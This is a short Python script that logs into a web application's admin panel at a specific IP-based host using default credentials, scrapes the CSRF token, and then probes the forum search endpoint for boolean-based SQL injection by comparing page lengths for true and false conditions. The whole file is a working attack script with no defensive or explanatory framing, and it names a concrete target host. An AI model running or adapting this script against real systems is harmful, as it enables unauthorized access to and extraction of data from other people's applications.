import requests
import re

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

def check(payload):
    url = f"{BASE_URL}/forums/search-topics?search=') OR ({payload}) AND ('1'='1"
    r = session.get(url)
    return len(r.text)

def main():
    if not login():
        print("[-] Login failed.")
        return
    
    # Try boolean conditions
    t = check("1=1")
    f = check("1=0")

    print(f"TRUE: {t}")
    print(f"FALSE: {f}")
    
    if t != f:
        print("[+] SQLi works with ADMIN session!")
    else:
        print("[-] SQLi still not showing difference. Trying a different injection point.")
        # Try injecting into cat_id or something else
        # Actually, let's see if we can find a topic ID
        r = session.get(f"{BASE_URL}/admin/forums")
        # Extract a number that looks like a topic count or ID
        print(f"[*] Admin Forums Page Sample:\n{r.text[:500]}")

if __name__ == "__main__":
    main()
